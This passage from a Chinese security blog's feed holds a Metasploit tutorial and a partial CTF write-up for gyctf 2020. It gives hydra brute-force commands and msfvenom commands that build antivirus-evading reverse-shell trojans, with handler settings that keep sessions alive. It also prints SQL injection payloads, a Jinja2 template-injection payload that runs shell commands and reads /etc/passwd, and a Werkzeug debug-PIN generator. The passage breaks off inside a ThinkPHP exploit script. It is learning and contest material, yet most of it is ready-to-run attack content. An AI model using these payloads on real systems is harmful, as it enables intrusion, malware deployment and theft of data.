id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h2><h3 id="hydra-3"><a href="#hydra-3" class="headerlink" title="hydra"></a>hydra</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -w 10 -P pass.txt -t 10 -v -f 127.0.0.1 mssql</span><br></pre></td></tr></table></figure><h3 id="msf-3"><a href="#msf-3" class="headerlink" title="msf"></a>msf</h3><p>使用<code>auxiliary/scanner/mssql/mssql_login</code>破解密码</p><h2 id="pcanywhere-vnc-3389"><a href="#pcanywhere-vnc-3389" class="headerlink" title="pcanywhere,vnc,3389"></a>pcanywhere,vnc,3389</h2><p>同样强大的hydra也支持以上三种，不过最新版本的hydra好像不支持3389的爆破了，只需改变服务类型就行</p><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>kali的<code>/usr/share/wordlists</code>目录下有很多</p><p>参考：</p><p><a href="https://blog.csdn.net/Fly_hps/article/details/80943541">https://blog.csdn.net/Fly_hps/article/details/80943541</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 弱口令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>metasploit学习</title>
      <link href="2020/02/26/metasploit%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/02/26/metasploit%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了msf的相关内容！</p><a id="more"></a><h2 id="什么是msf"><a href="#什么是msf" class="headerlink" title="什么是msf?"></a>什么是msf?</h2><p>msf全称<code>Metasploit Framework</code>，它集成了各平台上常见的溢出漏洞和流行的 shellcode ，并且不断更新，是目前世界上领先的渗透测试工具，是迄今为止使用Ruby构建的最复杂的项目之一，是信息安全与渗透测试领域最大的开源项目之一。</p><p>介绍几个概念：</p><p><strong>POC：</strong>一般是指证明漏洞存在的代码。</p><p><strong>Exploit(EXP)：</strong>攻击代码或程序，它允许攻击者利用易受攻击的系统并危害其安全性，每个漏洞都有对应的漏洞利用程序。通俗解释：漏洞利用脚本</p><p><strong>Payload：</strong>有效攻击载荷。通俗解释就是漏洞利用的主要操作，比如你请求某个url就能写马</p><p><strong>ShellCode：</strong>主要用在二进制溢出攻击上，比如控制填充数据的内容</p><h2 id="msf免杀"><a href="#msf免杀" class="headerlink" title="msf免杀"></a>msf免杀</h2><h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><h4 id="msfvenom简介"><a href="#msfvenom简介" class="headerlink" title="msfvenom简介"></a>msfvenom简介</h4><p>msfvenom是msfpayload和msfencode的结合体，于2015年6月8日取代了msfpayload和msfencode。在此之后，metasploit-framework下面的的msfpayload（荷载生成器），msfencoder（编码器），msfcli（监听接口）都不再被支持。</p><h4 id="一些简单的命令"><a href="#一些简单的命令" class="headerlink" title="一些简单的命令"></a>一些简单的命令</h4><p>比如想查看<code>windows/meterpreter/reverse_tcp</code>支持什么平台、哪些选项，可以使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp --list-options</span><br></pre></td></tr></table></figure><p>查看所有payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --list payloads</span><br></pre></td></tr></table></figure><p>查看所有编码器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --list encoders</span><br></pre></td></tr></table></figure><p><strong>生成windows木马</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -x encoder.exe  -i 15 -b <span class="string">&#x27;\x00&#x27;</span> -f exe -o payload.exe</span><br><span class="line"><span class="comment"># -e指使用哪个编码器</span></span><br><span class="line"><span class="comment"># -x指以哪个文件为模板</span></span><br><span class="line"><span class="comment"># -i指编码次数</span></span><br><span class="line"><span class="comment"># -bs是指去除坏字节</span></span><br><span class="line"><span class="comment"># -f指文件类型</span></span><br><span class="line"><span class="comment"># -o指输出文件路径</span></span><br></pre></td></tr></table></figure><p>也可以多重编码，使用管道让<code>msfvenom</code>对攻击载荷多重编码，先用<code>shikata_ga_nai</code>编码20次，接着来10次的<code>alpha_upper</code>编码，再来10次的<code>countdown</code>编码，最后才生成以<code>putty.exe</code>为模板的可执行文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom  -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=10.211.55.2 LPORT=3333 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw | msfvenom -e x86/countdown -i 10 -x putty.exe -f exe -o payload5.exe</span><br></pre></td></tr></table></figure><p>经过测试，发现使用的编码类型越多，免杀率可能会降低，猜测是因为各种编码引入了更多的特征码。同时生成的payload也很可能无法正常执行，这个也和被捆绑程序有一定关联。</p><p><strong>生成linux木马</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=47.97.210.141 LPORT=4444 -f elf &gt; shell</span><br></pre></td></tr></table></figure><p>参数和上面的一样</p><h4 id="几个重要的监听参数"><a href="#几个重要的监听参数" class="headerlink" title="几个重要的监听参数"></a>几个重要的监听参数</h4><p><strong>防止假session</strong></p><p>在实战中，经常会遇到假session或者刚连接就断开的情况，这里补充一些监听参数，防止假死与假session。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> ExitOnSession <span class="literal">false</span>   //可以在接收到seesion后继续监听端口，保持侦听。</span><br></pre></td></tr></table></figure><p><strong>防止session意外退出</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> SessionCommunicationTimeout 0  //默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> SessionExpirationTimeout 0 //默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭</span><br></pre></td></tr></table></figure><p><strong>handler后台持续监听</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi&#x2F;handler) &gt; exploit -j -z</span><br></pre></td></tr></table></figure><p>使用<code>exploit -j -z</code>可在后台持续监听,-j为后台任务，-z为持续监听，使用Jobs命令查看和管理后台任务。<code>jobs -K</code>可结束所有任务。</p><p>还有种比较快捷的建立监听的方式，在msf下直接执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -H 10.211.55.2 -P 3333 -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><h3 id="Evasion免杀"><a href="#Evasion免杀" class="headerlink" title="Evasion免杀"></a>Evasion免杀</h3><p>2019年1月，metasploit升级到了5.0，引入了一个新的模块叫Evasion模块，官方宣称这个模块可以创建反杀毒软件的木马。</p><p>evasion有以下几个模块,可以使用<code>show evasion</code>进行查看:</p><img src="/2020/02/26/metasploit%E5%AD%A6%E4%B9%A0/TIM截图20200227214226.png" style="zoom:67%;"><p>使用<code>windows/windows_defender_exe</code>进行生成payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use windows/windows_defender_exe</span><br><span class="line">msf5 evasion(windows/windows_defender_exe) &gt; <span class="built_in">set</span> filename payload.exe</span><br><span class="line">msf5 evasion(windows/windows_defender_exe) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 evasion(windows/windows_defender_exe) &gt; <span class="built_in">set</span> LHOST 10.211.55.3</span><br><span class="line">msf5 evasion(windows/windows_defender_exe) &gt; <span class="built_in">set</span> LPORT 3333</span><br><span class="line">msf5 evasion(windows/windows_defender_exe) &gt; run</span><br></pre></td></tr></table></figure><h2 id="msf溢出攻击"><a href="#msf溢出攻击" class="headerlink" title="msf溢出攻击"></a>msf溢出攻击</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><h4 id="cve-2019-0708"><a href="#cve-2019-0708" class="headerlink" title="cve_2019_0708"></a>cve_2019_0708</h4><p><a href="https://www.cnblogs.com/Oran9e/p/11479575.html">https://www.cnblogs.com/Oran9e/p/11479575.html</a></p><h4 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h4><p><a href="https://www.cnblogs.com/nanstar/p/12120656.html">https://www.cnblogs.com/nanstar/p/12120656.html</a></p><h4 id="ms08-067"><a href="#ms08-067" class="headerlink" title="ms08-067"></a>ms08-067</h4><p><a href="https://www.cnblogs.com/feizianquan/p/10799873.html">https://www.cnblogs.com/feizianquan/p/10799873.html</a></p><p>参考：</p><p><a href="https://www.zhihu.com/question/39878368">https://www.zhihu.com/question/39878368</a></p><p><a href="https://mp.weixin.qq.com/s/1r0iakLpnLrjCrOp2gT10w">https://mp.weixin.qq.com/s/1r0iakLpnLrjCrOp2gT10w</a></p><p><a href="https://mp.weixin.qq.com/s/A0CZslLhCLOK_HgkHGcpEA">https://mp.weixin.qq.com/s/A0CZslLhCLOK_HgkHGcpEA</a></p><p><a href="https://mp.weixin.qq.com/s/YnnCM7W20xScv52k_ubxYQ">https://mp.weixin.qq.com/s/YnnCM7W20xScv52k_ubxYQ</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新春战疫赛game-gyctf部分writeup</title>
      <link href="2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/"/>
      <url>2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了game-gyctf的部分writeup！</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h3><p>这题是是真的没想到！</p><p>注册一个账号进去发现里面有个黑页，然后用admin万能密码成功登陆进去，看到黑页</p><p>这个黑页不是漏洞点，漏洞点就在登陆上，可以直接联合查询，回显在登陆后的页面上</p><p><strong>order by:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; order by 6#</span><br></pre></td></tr></table></figure><p>登陆失败，说明有5列</p><p><strong>判断回显位：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,2,3,4,5#</span><br></pre></td></tr></table></figure><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM截图20200221214528.png" style="zoom:67%;"><p>回显位为第二个</p><p><strong>注数据库：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,group_concat(schema_name),3,4,5 from information_schema.schemata#</span><br></pre></td></tr></table></figure><p><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM%E6%88%AA%E5%9B%BE20200221215121.png"></p><p><strong>注表：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema&#x3D;database()#</span><br></pre></td></tr></table></figure><p><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM%E6%88%AA%E5%9B%BE20200221215337.png"></p><p><strong>注字段：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name&#x3D;&quot;flag&quot;#</span><br></pre></td></tr></table></figure><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM截图20200221215558.png" style="zoom:80%;"><p><strong>注内容：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,group_concat(flaaag),3,4,5 from nzhaopin.flag#</span><br></pre></td></tr></table></figure><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM截图20200221215929.png" style="zoom:80%;"><p>据说三个地方都有注入，登陆，注册，黑页，我真是太菜了</p><h3 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h3><h3 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h3><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><h3 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h3><p>看到立马想到了强网杯随便注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show tables;#表为FlagHere</span><br><span class="line">1&#39;;desc FlagHere; #查看表结构，发现有flag字段</span><br></pre></td></tr></table></figure><p>题目没有过滤handler，参见：</p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a></p><p><a href="https://skysec.top/2019/12/13/2019-FudanCTF-Writeup">https://skysec.top/2019/12/13/2019-FudanCTF-Writeup</a></p><p>handler类似于select语句，但又不同于后者，它只能每次查询1次记录</p><p>比如：通过handler语句查询users表的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">handler users open as moonback; #指定数据表进行载入并将返回句柄别名</span><br><span class="line">handler moonback read first; #读取指定表&#x2F;句柄的首行数据</span><br><span class="line">handler moonback read next; #读取指定表&#x2F;句柄的下一行数据</span><br><span class="line">handler moonback read next; #读取指定表&#x2F;句柄的下一行数据</span><br><span class="line">...</span><br><span class="line">handler moonback close; #关闭句柄</span><br></pre></td></tr></table></figure><p>所以我们就能查出flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">handler</span> FlagHere <span class="keyword">open</span> <span class="keyword">as</span> moonback;<span class="keyword">handler</span> moonback <span class="keyword">read</span> <span class="keyword">first</span>;</span><br><span class="line"><span class="comment"># 或者直接</span></span><br><span class="line">1&#x27;;<span class="keyword">handler</span> FlagHere <span class="keyword">open</span>;<span class="keyword">handler</span> FlagHere <span class="keyword">read</span> <span class="keyword">first</span>;</span><br></pre></td></tr></table></figure><h3 id="Flaskapp"><a href="#Flaskapp" class="headerlink" title="Flaskapp"></a>Flaskapp</h3><p>看名字猜测是和ssti沙箱逃逸相关内容</p><h4 id="不读取pin码"><a href="#不读取pin码" class="headerlink" title="不读取pin码"></a>不读取pin码</h4><p>随便输一个字符让base64解密报错，可以看到部分源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/decode&#x27;,methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.format(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure><p>简单的将一些关键字base64编码后提交发现知识简单的过滤了关键字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">request</span><br><span class="line">flag</span><br><span class="line">system</span><br><span class="line">popen</span><br><span class="line">import</span><br><span class="line">__import__</span><br><span class="line">importlib</span><br><span class="line">eval</span><br><span class="line">os</span><br><span class="line">subprocess</span><br></pre></td></tr></table></figure><p>因此我们可以直接改下：<a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti%E7%9A%84exp">https://github.com/vulhub/vulhub/tree/master/flask/ssti的exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;ev&#x27;</span>+<span class="string">&#x27;al&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;ev&#x27;</span>+<span class="string">&#x27;al&#x27;</span>](<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__(&quot;o&quot;+&quot;s&quot;).po&#x27;</span>+<span class="string">&#x27;pen(&quot;cat this_is_the_fl&quot;+&quot;ag.txt&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>将过滤的东西拼接到一块就能执行命令得到flag了</p><h4 id="读取pin码"><a href="#读取pin码" class="headerlink" title="读取pin码"></a>读取pin码</h4><p>先介绍一下pin码，flask项目运行时开启debug模式时会生成一个由当前环境的pin码，类似于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123-123-123</span><br></pre></td></tr></table></figure><p>也就是说在某个特定环境下pin码是不变的</p><p>输入正确的pin码我们就可以进入debug页面，然后输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;console</span><br></pre></td></tr></table></figure><p>可以进入python交互式shell</p><p>关于pin码详细介绍参考：<a href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a></p><p>我们需要知道6个值：</p><ol><li><code>username</code>，为启动flask的用户</li><li><code>modname</code>，为flask.app</li><li><code>getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</code>，为Flask</li><li><code>getattr(mod, &#39;__file__&#39;, None)</code>，flask包目录下的app.py的绝对路径，报错可以爆出来</li><li><code>uuid.getnode()</code> ，mac地址十进制</li><li><code>get_machine_id()</code>，/etc/machine-id</li></ol><p>知道这6个值我们就可以用大佬脚本跑出来pin码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;kingkk&#x27;</span>,<span class="comment"># username/etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/home/kingkk/.local/lib/python3.5/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),报错可以爆出来</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;52242498922&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;19949f18ce36422da1402b3e3fe53008&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id或者/proc/self/cgroup或/proc/sys/kernel/random/boot_i或注册表SOFTWARE\\Microsoft\\Cryptography值</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure><p>可以用下面的payload读取文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;/etc/passwd&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>从<code>/etc/passwd</code>可以看到有个<code>flaskweb</code>的用户，尝试着用下</p><p>读取<code>/proc/self/cgroup</code>，注意在docker环境中不要读<code>/etc/machine-id</code></p><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM截图20200225121213.png" style="zoom:80%;"><p>读取<code>/sys/class/net/eth0/address</code>获得mac地址<code>02:42:ac:12:00:04</code>，十进制表达式是<code>2485377957892</code></p><p>从报错中看到可以看到绝对路径为<code>/usr/local/lib/python3.7/site-packages/flask/app.py</code></p><p>将对应内容填入运行就能得到pin,我这里是<code>922-522-604</code></p><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM截图20200225122919.png" style="zoom:80%;"><h3 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h3><p>访问<code>www.zip</code>，有源码，题目考察的是thinkphp6.0.0最新的session的漏洞</p><p>参考：</p><p><a href="https://www.uedbox.com/post/65126/">https://www.uedbox.com/post/65126/</a></p><p><a href="https://paper.seebug.org/1114/#_1">https://paper.seebug.org/1114/#_1</a></p><p>报错可以看出版本信息</p><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM截图20200225142134.png" style="zoom:80%;"><p>先介绍一下TP框架的路由规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; index.php  &#x2F;Index    &#x2F;Index   &#x2F;index</span><br><span class="line">   入口文件   模块(前台)  控制器    方法</span><br></pre></td></tr></table></figure><p>本题的利用方式：</p><ol><li>先正常注册一个账号</li><li>登陆时抓包将sessid改成<code>.php</code>结尾，长度必须是32位</li><li>然后去搜索处输入东西，来到个人中心看搜索历史，这些搜索历史都保存在<code>/runtime/session/</code>目录内</li></ol><p>写了个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://182.92.243.154:7893/&#x27;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">data=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;moon&quot;</span>,<span 